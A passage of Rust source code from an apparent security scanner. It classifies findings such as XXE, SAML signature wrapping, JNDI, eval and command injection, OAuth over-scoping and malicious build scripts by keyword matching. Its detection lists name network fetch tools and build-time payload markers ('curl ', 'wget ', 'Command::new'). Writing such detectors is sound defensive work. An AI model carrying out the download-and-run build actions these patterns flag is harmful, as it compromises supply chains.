    if has_dangerous_html && has_user_input {
        return ProofClass::ReachabilityProof;
    }
    ProofClass::LatticeGapProposal
}

/// Returns `true` when a debug endpoint is present without an auth guard.
pub fn debug_endpoint_is_unguarded(has_debug_surface: bool, has_auth_guard: bool) -> bool {
    has_debug_surface && !has_auth_guard
}

/// Classifies a `security:unauthenticated_debug_endpoint` finding into a `ProofClass`.
///
/// - Test/script/dev-server path -> `InvariantViolationProof` (suppress)
/// - Auth or middleware marker in source -> `InvariantViolationProof` (suppress)
/// - Debug/internal/admin endpoint marker without auth -> `ReachabilityProof`
/// - Otherwise -> `LatticeGapProposal`
pub fn classify_debug_endpoint_proof(source: &str, finding: &StructuredFinding) -> ProofClass {
    let in_non_production_path = finding
        .file
        .as_deref()
        .map(|p| {
            p.contains("test")
                || p.contains("scripts/")
                || p.contains("server.mjs")
                || p.contains(".spec.")
                || p.contains(".test.")
        })
        .unwrap_or(false);
    if in_non_production_path {
        return ProofClass::InvariantViolationProof;
    }

    let has_auth_guard = source.contains("auth")
        || source.contains("authenticate")
        || source.contains("requiresAuth")
        || source.contains("middleware");
    if has_auth_guard {
        return ProofClass::InvariantViolationProof;
    }

    let has_debug_surface = source.contains("debug")
        || source.contains("pprof")
        || source.contains("metrics")
        || source.contains("/internal/")
        || source.contains("/admin/");
    if debug_endpoint_is_unguarded(has_debug_surface, has_auth_guard) {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Returns `true` when SAML/XML parsing is visible without XXE hardening.
pub fn xxe_saml_parser_is_unguarded(
    has_saml_xml_parser: bool,
    has_xxe_hardening: bool,
    in_test_path: bool,
) -> bool {
    has_saml_xml_parser && !has_xxe_hardening && !in_test_path
}

/// Classifies a `security:xxe_saml_parser` finding into a `ProofClass`.
///
/// - Test/mock/fixture path -> `InvariantViolationProof` (suppress)
/// - Parser hardening marker -> `InvariantViolationProof` (suppress)
/// - SAML/XML parser marker without hardening -> `ReachabilityProof`
/// - Otherwise -> `LatticeGapProposal`
pub fn classify_xxe_saml_parser_proof(source: &str, finding: &StructuredFinding) -> ProofClass {
    let path_lower = finding
        .file
        .as_deref()
        .unwrap_or_default()
        .to_ascii_lowercase();
    let in_test_path = path_lower.contains("test")
        || path_lower.contains("fixture")
        || path_lower.contains("mock")
        || path_lower.contains("spec");
    if in_test_path {
        return ProofClass::InvariantViolationProof;
    }

    let source_lower = source.to_ascii_lowercase();
    let has_xxe_hardening = source_lower.contains("disallow-doctype-decl")
        || source_lower.contains("external-general-entities")
        || source_lower.contains("external-parameter-entities")
        || source_lower.contains("load-external-dtd")
        || source_lower.contains("feature_secure_processing")
        || source_lower.contains("resolveentities:false")
        || source_lower.contains("resolve_entities=false")
        || source_lower.contains("no_network=true")
        || source_lower.contains("disable_external_entities")
        || source_lower.contains("forbid_dtd")
        || source_lower.contains("defusedxml");
    if has_xxe_hardening {
        return ProofClass::InvariantViolationProof;
    }

    let has_saml = source_lower.contains("saml")
        || source_lower.contains("samlresponse")
        || source_lower.contains("assertion")
        || source_lower.contains("urn:oasis:names:tc:saml");
    let has_xml_parser = source_lower.contains("xmldom")
        || source_lower.contains("xml2js")
        || source_lower.contains("documentbuilderfactory.newinstance(")
        || source_lower.contains("saxparserfactory.newinstance(")
        || source_lower.contains("lxml.etree.fromstring")
        || source_lower.contains("xml.etree.elementtree.fromstring")
        || source_lower.contains("xml.dom.minidom.parse")
        || source_lower.contains("xml.newdecoder(");
    if xxe_saml_parser_is_unguarded(has_saml && has_xml_parser, has_xxe_hardening, in_test_path) {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Returns `true` when SAML signature validation can bind one assertion while
/// downstream logic consumes a different selected assertion.
pub fn saml_xsw_validation_order_is_reachable(
    has_saml_parser: bool,
    has_signature_validation: bool,
    consumes_selected_assertion_after_signature: bool,
    has_assertion_binding_guard: bool,
    in_test_or_generated_path: bool,
) -> bool {
    has_saml_parser
        && has_signature_validation
        && consumes_selected_assertion_after_signature
        && !has_assertion_binding_guard
        && !in_test_or_generated_path
}

/// Classifies a `security:saml_xsw_validation_order` finding into a `ProofClass`.
///
/// - Test/generated/metadata paths -> `InvariantViolationProof` (suppress)
/// - Same-assertion binding or validated-assertion helpers -> `InvariantViolationProof`
/// - Signature validation before later selected-assertion consumption -> `ReachabilityProof`
/// - Otherwise -> `LatticeGapProposal`
pub fn classify_saml_xsw_validation_order_proof(
    source: &str,
    finding: &StructuredFinding,
) -> ProofClass {
    let path_lower = finding
        .file
        .as_deref()
        .unwrap_or_default()
        .to_ascii_lowercase();
    let in_test_or_generated_path = path_lower.contains("test")
        || path_lower.contains("fixture")
        || path_lower.contains("mock")
        || path_lower.contains("spec")
        || path_lower.contains("generated")
        || path_lower.contains("/client")
        || path_lower.contains("metadata");
    if in_test_or_generated_path {
        return ProofClass::InvariantViolationProof;
    }

    let source_lower = source.to_ascii_lowercase();
    let metadata_loader = source_lower.contains("metadata")
        && !source_lower.contains("samlresponse")
        && !source_lower.contains("subjectconfirmationdata");
    if metadata_loader {
        return ProofClass::InvariantViolationProof;
    }

    let has_saml_parser = (source_lower.contains("saml")
        || source_lower.contains("samlresponse")
        || source_lower.contains("assertion")
        || source_lower.contains("urn:oasis:names:tc:saml"))
        && (source_lower.contains("documentbuilderfactory.newinstance(")
            || source_lower.contains("saxparserfactory.newinstance(")
            || source_lower.contains("xml.newdecoder(")
            || source_lower.contains("xmldom")
            || source_lower.contains("xml2js")
            || source_lower.contains("lxml.etree.fromstring")
            || source_lower.contains("xml.etree.elementtree.fromstring")
            || source_lower.contains("parse("));
    let has_signature_validation = source_lower.contains("verifysignature")
        || source_lower.contains("validate(signature")
        || source_lower.contains("signaturevalidator")
        || source_lower.contains("checksignature")
        || source_lower.contains("xmlsec")
        || source_lower.contains("validate_signature")
        || source_lower.contains("verify_signature")
        || source_lower.contains("signature.validate")
        || source_lower.contains("validator.validate");
    let consumes_selected_assertion_after_signature = source_lower
        .contains("getelementsbytagname(\"assertion\"")
        || source_lower.contains("getelementsbytagname('assertion'")
        || source_lower.contains("selectnodes(\"//")
        || source_lower.contains("xpath")
        || source_lower.contains("assertions[")
        || source_lower.contains("getassertion(")
        || source_lower.contains("nameid")
        || source_lower.contains("subjectconfirmationdata")
        || source_lower.contains("inresponseto");
    let has_assertion_binding_guard = source_lower.contains("validatedassertion")
        || source_lower.contains("verifiedassertion")
        || source_lower.contains("signedassertion")
        || source_lower.contains("getverifiedassertion")
        || source_lower.contains("validateassertion(")
        || source_lower.contains("validateinresponseto(")
        || source_lower.contains("setidattribute")
        || source_lower.contains("idresolver.registerelementbyid")
        || source_lower.contains("securevalidation")
        || source_lower.contains("subjectconfirmationdata")
            && source_lower.contains("inresponseto")
            && source_lower.contains("destination")
            && source_lower.contains("audience");
    if has_assertion_binding_guard {
        return ProofClass::InvariantViolationProof;
    }
    if saml_xsw_validation_order_is_reachable(
        has_saml_parser,
        has_signature_validation,
        consumes_selected_assertion_after_signature,
        has_assertion_binding_guard,
        in_test_or_generated_path,
    ) {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Returns `true` when a JNDI lookup accepts attacker-controlled input without
/// allowlist, constant-only naming, or local container-context restriction.
pub fn jndi_lookup_is_untrusted(
    has_jndi_lookup: bool,
    has_untrusted_source: bool,
    has_allowlist_or_constant_context: bool,
    in_test_or_local_path: bool,
) -> bool {
    has_jndi_lookup
        && has_untrusted_source
        && !has_allowlist_or_constant_context
        && !in_test_or_local_path
}

/// Classifies a `security:jndi_injection` finding into a `ProofClass`.
///
/// - Tests/migrations/generated/local container config -> `InvariantViolationProof`
/// - Allowlist or constant-only naming -> `InvariantViolationProof`
/// - HTTP/body/header input reaching lookup/resolve -> `ReachabilityProof`
/// - Dynamic lookup without source proof -> `LatticeGapProposal`
pub fn classify_jndi_injection_proof(source: &str, finding: &StructuredFinding) -> ProofClass {
    let path_lower = finding
        .file
        .as_deref()
        .unwrap_or_default()
        .to_ascii_lowercase();
    let in_test_or_local_path = path_lower.contains("test")
        || path_lower.contains("fixture")
        || path_lower.contains("mock")
        || path_lower.contains("spec")
        || path_lower.contains("migration")
        || path_lower.contains("generated")
        || path_lower.contains("local")
        || path_lower.contains("cache")
        || path_lower.contains("session");
    if in_test_or_local_path {
        return ProofClass::InvariantViolationProof;
    }

    let source_lower = source.to_ascii_lowercase();
    let has_jndi_lookup = (source_lower.contains("initialcontext")
        || source_lower.contains("context ctx")
        || source_lower.contains("context context")
        || source_lower.contains("namingcontext"))
        && (source_lower.contains(".lookup(") || source_lower.contains(".resolve("));
    let has_untrusted_source = source_lower.contains("request.getparameter(")
        || source_lower.contains("request.getheader(")
        || source_lower.contains("request.getquerystring(")
        || source_lower.contains("@requestparam")
        || source_lower.contains("@pathvariable")
        || source_lower.contains("httpservletrequest")
        || source_lower.contains("servletrequest")
        || source_lower.contains("jsonnode")
        || source_lower.contains("objectmapper.readvalue(")
        || source_lower.contains("exchange.getin().getheader")
        || source_lower.contains("body.get(");
    let has_allowlist_or_constant_context = source_lower.contains("lookup(\"java:")
        || source_lower.contains("lookup('java:")
        || source_lower.contains("lookup(\"jdbc/")
        || source_lower.contains("lookup('jdbc/")
        || source_lower.contains("java:comp/env")
        || source_lower.contains("java:jboss")
        || source_lower.contains("context.provider_url")
        || source_lower.contains("system.getproperty(")
        || source_lower.contains("system.getenv(")
        || source_lower.contains("allowedjndi")
        || source_lower.contains("jndiallowlist")
        || source_lower.contains("jndi_allowlist")
        || source_lower.contains("whitelist")
        || source_lower.contains("allowlist")
        || source_lower.contains("validatejndi(")
        || source_lower.contains("isallowedjndi(")
        || source_lower.contains("startswith(\"java:")
        || source_lower.contains("startswith('java:");
    if has_allowlist_or_constant_context {
        return ProofClass::InvariantViolationProof;
    }
    if jndi_lookup_is_untrusted(
        has_jndi_lookup,
        has_untrusted_source,
        has_allowlist_or_constant_context,
        in_test_or_local_path,
    ) {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Returns `true` when dynamic code evaluation accepts attacker-controlled
/// input without an allowlist, sandbox, or static-expression guard.
pub fn eval_injection_is_untrusted(
    has_eval_sink: bool,
    has_untrusted_source: bool,
    has_allowlist_or_sandbox: bool,
    in_test_or_local_path: bool,
) -> bool {
    has_eval_sink && has_untrusted_source && !has_allowlist_or_sandbox && !in_test_or_local_path
}

/// Classifies a `security:eval_injection` finding into a `ProofClass`.
///
/// - Test/script/generated/local paths -> `InvariantViolationProof`
/// - Allowlist, sandbox, or literal-only evaluator -> `InvariantViolationProof`
/// - Dynamic eval/load/loadstring on request-controlled data -> `ReachabilityProof`
/// - Otherwise -> `LatticeGapProposal`
pub fn classify_eval_injection_proof(source: &str, finding: &StructuredFinding) -> ProofClass {
    let path_lower = finding
        .file
        .as_deref()
        .unwrap_or_default()
        .to_ascii_lowercase();
    let in_test_or_local_path = path_lower.contains("test")
        || path_lower.contains("fixture")
        || path_lower.contains("mock")
        || path_lower.contains("spec")
        || path_lower.contains("generated")
        || path_lower.contains("migrations/")
        || path_lower.contains("migration")
        || path_lower.contains("examples/")
        || path_lower.contains("scripts/")
        || path_lower.contains("/script/")
        || path_lower.contains("local")
        || path_lower.contains("admin_config");
    if in_test_or_local_path {
        return ProofClass::InvariantViolationProof;
    }

    let source_lower = source.to_ascii_lowercase();
    let has_allowlist_or_sandbox = source_lower.contains("ast.literal_eval")
        || source_lower.contains("safe_eval")
        || source_lower.contains("sandbox")
        || source_lower.contains("allowlist")
        || source_lower.contains("whitelist")
        || source_lower.contains("permitted")
        || source_lower.contains("validate_eval")
        || source_lower.contains("validateexpression")
        || source_lower.contains("is_allowed_expression")
        || source_lower.contains("allowed_expression");
    if has_allowlist_or_sandbox {
        return ProofClass::InvariantViolationProof;
    }

    let has_eval_sink = source_lower.lines().any(dynamic_eval_line);
    let has_literal_only_eval = !has_eval_sink
        && source_lower.lines().any(|line| {
            let line = line.trim();
            line.contains("eval(\"")
                || line.contains("eval('")
                || line.contains("loadstring(\"")
                || line.contains("loadstring('")
                || line.contains("load(\"")
                || line.contains("load('")
        });
    if has_literal_only_eval {
        return ProofClass::InvariantViolationProof;
    }

    let has_untrusted_source = source_lower.contains("request.")
        || source_lower.contains("request[")
        || source_lower.contains("req.")
        || source_lower.contains("req[")
        || source_lower.contains("ngx.req")
        || source_lower.contains("ngx.var.arg")
        || source_lower.contains("ngx.var.http")
        || source_lower.contains("ngx.var.cookie")
        || source_lower.contains("headers")
        || source_lower.contains("getheader")
        || source_lower.contains("getparameter")
        || source_lower.contains("@requestparam")
        || source_lower.contains("@pathvariable")
        || source_lower.contains("params[")
        || source_lower.contains("query[")
        || source_lower.contains("body[")
        || source_lower.contains("json.loads(request")
        || source_lower.contains("jsonnode");
    if eval_injection_is_untrusted(
        has_eval_sink,
        has_untrusted_source,
        has_allowlist_or_sandbox,
        in_test_or_local_path,
    ) {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

fn dynamic_eval_line(line: &str) -> bool {
    let trimmed = line.trim();
    if trimmed.contains("ast.literal_eval") {
        return false;
    }
    for marker in ["eval(", "loadstring(", "load("] {
        if let Some(idx) = trimmed.find(marker) {
            let after = trimmed[idx + marker.len()..].trim_start();
            if !after.starts_with('"') && !after.starts_with('\'') {
                return true;
            }
        }
    }
    trimmed.contains("assert(load") || trimmed.contains("pcall(load")
}

/// Returns `true` when a process-execution sink accepts attacker-controlled
/// command input without an allowlist, fixed binary, or strict argument map.
pub fn process_builder_is_untrusted(
    has_process_sink: bool,
    has_untrusted_source: bool,
    has_command_guard: bool,
    in_test_or_admin_path: bool,
) -> bool {
    has_process_sink && has_untrusted_source && !has_command_guard && !in_test_or_admin_path
}

/// Classifies a `security:process_builder_injection` finding into a `ProofClass`.
///
/// - Tests/migrations/local installers/Windows service tooling -> `InvariantViolationProof`
/// - Fixed argv, enum mapping, or allowlist guard -> `InvariantViolationProof`
/// - Request-controlled command reaching ProcessBuilder/Runtime.exec -> `ReachabilityProof`
/// - Otherwise -> `LatticeGapProposal`
pub fn classify_process_builder_injection_proof(
    source: &str,
    finding: &StructuredFinding,
) -> ProofClass {
    let path_lower = finding
        .file
        .as_deref()
        .unwrap_or_default()
        .to_ascii_lowercase();
    let in_test_or_admin_path = path_lower.contains("test")
        || path_lower.contains("fixture")
        || path_lower.contains("mock")
        || path_lower.contains("spec")
        || path_lower.contains("migration")
        || path_lower.contains("generated")
        || path_lower.contains("examples/")
        || path_lower.contains("windowsserviceinstall")
        || path_lower.contains("serviceinstall")
        || path_lower.contains("installer")
        || path_lower.contains("/cli/")
        || path_lower.contains("/admin/");
    if in_test_or_admin_path {
        return ProofClass::InvariantViolationProof;
    }

    let source_lower = source.to_ascii_lowercase();
    let has_process_sink = source_lower.contains("new processbuilder(")
        || source_lower.contains("processbuilder(")
        || source_lower.contains("runtime.getruntime().exec(")
        || (source_lower.contains(".command(") && source_lower.contains("processbuilder"));
    let has_untrusted_source = source_lower.contains("request.getparameter(")
        || source_lower.contains("request.getheader(")
        || source_lower.contains("request.getquerystring(")
        || source_lower.contains("@requestparam")
        || source_lower.contains("@pathvariable")
        || source_lower.contains("httpservletrequest")
        || source_lower.contains("servletrequest")
        || source_lower.contains("jsonnode")
        || source_lower.contains("objectmapper.readvalue(")
        || source_lower.contains("exchange.getin().getheader")
        || source_lower.contains("body.get(")
        || source_lower.contains("req.getparameter(")
        || source_lower.contains("req.getheader(");
    let has_command_guard = source_lower.contains("allowlist")
        || source_lower.contains("whitelist")
        || source_lower.contains("allowedcommand")
        || source_lower.contains("isallowedcommand")
        || source_lower.contains("validatecommand")
        || source_lower.contains("commandenum")
        || source_lower.contains("enumset")
        || source_lower.contains("switch (")
        || source_lower.contains("switch(")
        || source_lower.contains("map.of(")
        || source_lower.contains("list.of(\"")
        || source_lower.contains("new processbuilder(\"")
        || source_lower.contains(".command(\"");
    if has_command_guard {
        return ProofClass::InvariantViolationProof;
    }
    if process_builder_is_untrusted(
        has_process_sink,
        has_untrusted_source,
        has_command_guard,
        in_test_or_admin_path,
    ) {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Returns `true` when a production auth/crypto path can downgrade away from a
/// configured hybrid/PQC requirement without a policy pin or allowlist.
pub fn pqc_hybrid_downgrade_is_reachable(
    has_hybrid_requirement: bool,
    has_downgrade_path: bool,
    has_policy_pin_or_allowlist: bool,
    in_test_or_generated_path: bool,
) -> bool {
    has_hybrid_requirement
        && has_downgrade_path
        && !has_policy_pin_or_allowlist
        && !in_test_or_generated_path
}

/// Classifies a `security:pqc_hybrid_downgrade` finding into a `ProofClass`.
///
/// - Test/generated/docs/key-utility-only paths -> `InvariantViolationProof`
/// - Explicit algorithm policy pins or allowlists -> `InvariantViolationProof`
/// - Production hybrid/PQC negotiation accepting legacy algorithms -> `ReachabilityProof`
/// - Otherwise -> `LatticeGapProposal`
pub fn classify_pqc_hybrid_downgrade_proof(
    source: &str,
    finding: &StructuredFinding,
) -> ProofClass {
    let path_lower = finding
        .file
        .as_deref()
        .unwrap_or_default()
        .to_ascii_lowercase();
    let in_test_or_generated_path = path_lower.contains("test")
        || path_lower.contains("fixture")
        || path_lower.contains("mock")
        || path_lower.contains("spec")
        || path_lower.contains("generated")
        || path_lower.contains("migration")
        || path_lower.contains("examples/")
        || path_lower.contains("/docs/")
        || path_lower.ends_with(".md")
        || (path_lower.contains("keyutils") && !path_lower.contains("auth"));
    if in_test_or_generated_path {
        return ProofClass::InvariantViolationProof;
    }

    let source_lower = source.to_ascii_lowercase();
    let has_hybrid_requirement = source_lower.contains("pqc")
        || source_lower.contains("post-quantum")
        || source_lower.contains("post quantum")
        || source_lower.contains("ml-dsa")
        || source_lower.contains("mldsa")
        || source_lower.contains("dilithium")
        || source_lower.contains("slh-dsa")
        || source_lower.contains("ml-kem")
        || source_lower.contains("mlkem")
        || source_lower.contains("hybrid");
    let has_legacy_algorithm = source_lower.contains("rsa")
        || source_lower.contains("ecdsa")
        || source_lower.contains("ecdh")
        || source_lower.contains("x25519")
        || source_lower.contains("ed25519")
        || source_lower.contains("sha1withrsa")
        || source_lower.contains("rs256")
        || source_lower.contains("es256");
    let has_negotiation_or_verification = source_lower.contains("algorithm")
        || source_lower.contains(" alg")
        || source_lower.contains("signature")
        || source_lower.contains("verify")
        || source_lower.contains("jwt")
        || source_lower.contains("jws")
        || source_lower.contains("certificate")
        || source_lower.contains("provider");
    let has_downgrade_path = has_legacy_algorithm && has_negotiation_or_verification;
    let has_policy_pin_or_allowlist = source_lower.contains("allowlist")
        || source_lower.contains("whitelist")
        || source_lower.contains("allowedalgorithms")
        || source_lower.contains("permittedalgorithms")
        || source_lower.contains("minimumsecurity")
        || source_lower.contains("min_security")
        || source_lower.contains("requirepqc")
        || source_lower.contains("require_pqc")
        || source_lower.contains("requirehybrid")
        || source_lower.contains("require_hybrid")
        || source_lower.contains("policy.pin")
        || source_lower.contains("policy_pin")
        || source_lower.contains("rejectlegacy")
        || source_lower.contains("reject_legacy");
    if has_policy_pin_or_allowlist {
        return ProofClass::InvariantViolationProof;
    }

    if pqc_hybrid_downgrade_is_reachable(
        has_hybrid_requirement,
        has_downgrade_path,
        has_policy_pin_or_allowlist,
        in_test_or_generated_path,
    ) {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Returns `true` when a production OAuth/token path grants broad scope to
/// untrusted input without audience, resource, or least-privilege constraints.
pub fn oauth_excessive_scope_is_reachable(
    has_sensitive_scope: bool,
    has_untrusted_or_token_context: bool,
    has_audience_or_least_privilege_guard: bool,
    in_test_or_admin_path: bool,
) -> bool {
    has_sensitive_scope
        && has_untrusted_or_token_context
        && !has_audience_or_least_privilege_guard
        && !in_test_or_admin_path
}

/// Classifies a `security:oauth_excessive_scope` finding into a `ProofClass`.
///
/// - Tests/examples/generated/local/admin config -> `InvariantViolationProof`
/// - Audience/resource/least-privilege scope constraints -> `InvariantViolationProof`
/// - Production OAuth/token code granting admin/repo/wildcard scope -> `ReachabilityProof`
/// - Otherwise -> `LatticeGapProposal`
pub fn classify_oauth_excessive_scope_proof(
    source: &str,
    finding: &StructuredFinding,
) -> ProofClass {
    let path_lower = finding
        .file
        .as_deref()
        .unwrap_or_default()
        .to_ascii_lowercase();
    let in_test_or_admin_path = path_lower.contains("test")
        || path_lower.contains("fixture")
        || path_lower.contains("mock")
        || path_lower.contains("spec")
        || path_lower.contains("generated")
        || path_lower.contains("examples/")
        || path_lower.contains("/docs/")
        || path_lower.contains("local")
        || path_lower.contains("operator")
        || path_lower.contains("/admin/")
        || path_lower.ends_with(".md");
    if in_test_or_admin_path {
        return ProofClass::InvariantViolationProof;
    }

    let source_lower = source.to_ascii_lowercase();
    let has_sensitive_scope = source_lower.contains("admin:org")
        || source_lower.contains("admin:enterprise")
        || source_lower.contains("id-token: write")
        || source_lower.contains("id-token:write")
        || source_lower.contains("permissions: write-all")
        || source_lower.contains("scope=*")
        || source_lower.contains("scope=%2a")
        || source_lower.contains("\"scope\":\"*\"")
        || source_lower.contains("scope: \"*\"")
        || source_lower.contains("scope: [\"*\"]")
        || source_lower.contains("scope=repo")
        || source_lower.contains("scope: repo")
        || source_lower.contains(" repo ")
        || source_lower.contains(" repo,")
        || source_lower.contains(" repo\"");
    let has_untrusted_or_token_context = source_lower.contains("oauth")
        || source_lower.contains("github")
        || source_lower.contains("authorization_url")
        || source_lower.contains("request_token")
        || source_lower.contains("scopedtoken")
        || source_lower.contains("access_token")
        || source_lower.contains("client_id")
        || source_lower.contains("request.")
        || source_lower.contains("req.")
        || source_lower.contains("workflow_dispatch")
        || source_lower.contains("pull_request_target");
    let has_audience_or_least_privilege_guard = source_lower.contains("audience:")
        || source_lower.contains("audience=")
        || source_lower.contains("resource:")
        || source_lower.contains("resource=")
        || source_lower.contains("allowed_scopes")
        || source_lower.contains("allowedscopes")
        || source_lower.contains("leastprivilege")
        || source_lower.contains("least_privilege")
        || source_lower.contains("validate_scope")
        || source_lower.contains("validatescope")
        || source_lower.contains("scope_allowlist")
        || source_lower.contains("scopeallowlist")
        || source_lower.contains("read:user user:email");
    if has_audience_or_least_privilege_guard {
        return ProofClass::InvariantViolationProof;
    }

    if oauth_excessive_scope_is_reachable(
        has_sensitive_scope,
        has_untrusted_or_token_context,
        has_audience_or_least_privilege_guard,
        in_test_or_admin_path,
    ) {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Returns `true` when production artifact ingestion lacks checksum,
/// signature, SLSA, or equivalent provenance verification.
pub fn unverified_provenance_is_reachable(
    has_artifact_ingestion: bool,
    has_provenance_guard: bool,
    in_nonproduction_path: bool,
) -> bool {
    has_artifact_ingestion && !has_provenance_guard && !in_nonproduction_path
}

/// Classifies a `supply_chain:unverified_provenance` finding into a `ProofClass`.
///
/// - Tests/docs/examples/generated/local caches -> `InvariantViolationProof`
/// - Checksum/signature/SLSA/Sigstore provenance -> `InvariantViolationProof`
/// - Production raw artifact/dependency ingestion without provenance -> `ReachabilityProof`
/// - Otherwise -> `LatticeGapProposal`
pub fn classify_unverified_provenance_proof(
    source: &str,
    finding: &StructuredFinding,
) -> ProofClass {
    let path_lower = finding
        .file
        .as_deref()
        .unwrap_or_default()
        .replace('\\', "/")
        .to_ascii_lowercase();
    let in_nonproduction_path = path_lower.contains("test")
        || path_lower.contains("fixture")
        || path_lower.contains("mock")
        || path_lower.contains("spec")
        || path_lower.contains("generated")
        || path_lower.contains("examples/")
        || path_lower.contains("/docs/")
        || path_lower.contains("/sample")
        || path_lower.contains("/samples/")
        || path_lower.contains("/local/")
        || path_lower.contains("/cache/")
        || path_lower.ends_with(".md");
    if in_nonproduction_path {
        return ProofClass::InvariantViolationProof;
    }

    let source_lower = source.to_ascii_lowercase();
    let manifest_or_release_path = path_lower.ends_with("cargo.toml")
        || path_lower.ends_with("package.json")
        || path_lower.ends_with("go.mod")
        || path_lower.ends_with("pyproject.toml")
        || path_lower.ends_with("pom.xml")
        || path_lower.ends_with("build.gradle")
        || path_lower.ends_with(".yml")
        || path_lower.ends_with(".yaml")
        || path_lower.ends_with("dockerfile");
    let has_raw_artifact_reference = source_lower.contains("git =")
        || source_lower.contains("git+")
        || source_lower.contains("github.com/")
        || source_lower.contains("http_archive(")
        || source_lower.contains("curl ")
        || source_lower.contains("wget ")
        || source_lower.contains("releases/download")
        || source_lower.contains("archive/refs")
        || source_lower.contains("actions/download-artifact")
        || source_lower.contains("add https://")
        || source_lower.contains("url = \"http");
    let has_install_or_release_context = manifest_or_release_path
        || source_lower.contains("[dependencies]")
        || source_lower.contains("\"dependencies\"")
        || source_lower.contains("require (")
        || source_lower.contains("<dependency>")
        || source_lower.contains("download")
        || source_lower.contains("artifact")
        || source_lower.contains("release");
    let has_artifact_ingestion = has_raw_artifact_reference && has_install_or_release_context;
    let has_provenance_guard = source_lower.contains("sha256")
        || source_lower.contains("sha384")
        || source_lower.contains("sha512")
        || source_lower.contains("checksum")
        || source_lower.contains("integrity")
        || source_lower.contains("cosign")
        || source_lower.contains("sigstore")
        || source_lower.contains("slsa")
        || source_lower.contains("attestation")
        || source_lower.contains("provenance")
        || source_lower.contains("gpg --verify")
        || source_lower.contains("minisign")
        || source_lower.contains("trusted registry")
        || source_lower.contains("registry allowlist")
        || source_lower.contains("registry_allowlist");
    if has_provenance_guard {
        return ProofClass::InvariantViolationProof;
    }

    if unverified_provenance_is_reachable(
        has_artifact_ingestion,
        has_provenance_guard,
        in_nonproduction_path,
    ) {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Returns `true` when a production package build lifecycle executes a
/// dependency-controlled payload without sandbox, provenance, or allowlist.
pub fn cargo_build_worm_is_reachable(
    has_build_lifecycle: bool,
    has_dangerous_payload: bool,
    has_build_guard: bool,
    in_nonproduction_path: bool,
) -> bool {
    has_build_lifecycle && has_dangerous_payload && !has_build_guard && !in_nonproduction_path
}

/// Classifies a `security:cargo_build_worm` finding into a `ProofClass`.
///
/// - Tests/docs/examples/generated/local scripts -> `InvariantViolationProof`
/// - OUT_DIR sandbox/provenance/allowlist/lockfile guards -> `InvariantViolationProof`
/// - Production build/install lifecycle with unsafe payload -> `ReachabilityProof`
/// - Otherwise -> `LatticeGapProposal`
pub fn classify_cargo_build_worm_proof(source: &str, finding: &StructuredFinding) -> ProofClass {
    let path_lower = finding
        .file
        .as_deref()
        .unwrap_or_default()
        .replace('\\', "/")
        .to_ascii_lowercase();
    let in_nonproduction_path = path_lower.contains("test")
        || path_lower.contains("fixture")
        || path_lower.contains("mock")
        || path_lower.contains("spec")
        || path_lower.contains("generated")
        || path_lower.contains("examples/")
        || path_lower.contains("/docs/")
        || path_lower.contains("/sample")
        || path_lower.contains("/samples/")
        || path_lower.contains("/local/")
        || path_lower.contains("/devcontainer/")
        || path_lower.ends_with(".md");
    if in_nonproduction_path {
        return ProofClass::InvariantViolationProof;
    }

    let source_lower = source.to_ascii_lowercase();
    let has_build_lifecycle = path_lower.ends_with("build.rs")
        || path_lower.ends_with("package.json")
        || path_lower.ends_with("setup.py")
        || source_lower.contains("cargo:rerun-if")
        || source_lower.contains("\"preinstall\"")
        || source_lower.contains("\"postinstall\"")
        || source_lower.contains("build-script")
        || source_lower.contains("build_script");
    let has_dangerous_payload = source_lower.contains("std::process::command")
        || source_lower.contains("command::new")
        || source_lower.contains(".arg(\"-c\")")
        || source_lower.contains(".arg(\"/c\")")
        || source_lower.contains("curl ")
        || source_lower.contains("wget ")
        || source_lower.contains("reqwest::")
        || source_lower.contains("ureq::")
        || source_lower.contains("git clone")
        || source_lower.contains("fs::write")
        || source_lower.contains("std::fs::write")
        || source_lower.contains("file::create")
        || source_lower.contains("openoptions::new");
    let has_build_guard = source_lower.contains("out_dir")
        || source_lower.contains("env::var(\"out_dir\")")
        || source_lower.contains("sha256")
        || source_lower.contains("sha384")
        || source_lower.contains("sha512")
        || source_lower.contains("checksum")
        || source_lower.contains("cosign")
        || source_lower.contains("sigstore")
        || source_lower.contains("gpg --verify")
        || source_lower.contains("allowlist")
        || source_lower.contains("allowed_commands")
        || source_lower.contains("locked = true")
        || source_lower.contains("cargo.lock");
    if has_build_guard {
        return ProofClass::InvariantViolationProof;
    }

    if cargo_build_worm_is_reachable(
        has_build_lifecycle,
        has_dangerous_payload,
        has_build_guard,
        in_nonproduction_path,
    ) {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Returns `true` when a production CI or package lifecycle can persist code
/// through a startup hook without attestation or allowlist.
pub fn ci_persistence_vector_is_reachable(
    has_persistence_sink: bool,
    has_ci_or_package_lifecycle: bool,
    has_attestation_or_allowlist: bool,
    in_nonproduction_path: bool,
) -> bool {
    has_persistence_sink
        && has_ci_or_package_lifecycle
        && !has_attestation_or_allowlist
        && !in_nonproduction_path
}

/// Classifies a `security:ci_persistence_vector` finding into a `ProofClass`.
///
/// - Tests/docs/examples/local admin installers -> `InvariantViolationProof`
/// - Attestation or strict allowlist -> `InvariantViolationProof`
/// - Production CI/package lifecycle persistence without guard -> `ReachabilityProof`
/// - Otherwise -> `LatticeGapProposal`
pub fn classify_ci_persistence_vector_proof(
    source: &str,
    finding: &StructuredFinding,
) -> ProofClass {
    let path_lower = finding
        .file
        .as_deref()
        .unwrap_or_default()
        .replace('\\', "/")
        .to_ascii_lowercase();
    let in_nonproduction_path = path_lower.contains("test")
        || path_lower.contains("fixture")
        || path_lower.contains("mock")
        || path_lower.contains("spec")
        || path_lower.contains("generated")
        || path_lower.contains("examples/")
        || path_lower.contains("/docs/")
